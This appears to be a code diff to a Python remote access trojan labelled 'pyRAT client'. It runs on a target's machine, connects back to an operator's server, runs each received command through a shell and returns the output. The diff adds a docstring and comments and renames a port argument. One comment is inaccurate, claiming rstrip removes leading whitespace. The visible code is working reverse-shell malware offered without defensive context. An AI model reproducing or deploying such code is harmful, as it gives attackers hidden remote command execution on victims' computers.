@@ -1,3 +1,12 @@
+"""
+Simple pyRAT client
+
+Usage: v_client.py -a ADDRESS -p PORT
+
+Notes: Execute on clients machine, open connection back to server
+
+"""
+
 import subprocess
 import socket
 import argparse
@@ -9,9 +18,11 @@ def usage():
 
 
 def execute_command(cmd):
+    # remove leading whitespace using rstrip method
     cmd = cmd.rstrip()
 
     try:
+        # execute the cmd locally
         results = subprocess.check_output(cmd, stderr=subprocess.STDOUT, shell=True)
     except Exception as e:
         results = "[-] Error: Could not execute command => " + cmd
@@ -26,6 +37,7 @@ def receive_data(client):
 
             if not received_cmd:
                 continue
+
             cmd_results = execute_command(received_cmd)
             client.send(cmd_results)
     except Exception as e:
@@ -54,7 +66,7 @@ def parse():
                                      usage='%(prog)s [-a] address [-p] port'
                                      )
     parser.add_argument("-a", "--address", type=str, help="Server IP address")
-    parser.add_argument("-p", "--ports", type=int, default="9999", help="Port to connect with")
+    parser.add_argument("-p", "--port", type=int, default="9999", help="Port to connect with")
 
     args = parser.parse_args()
     if args.address == None:
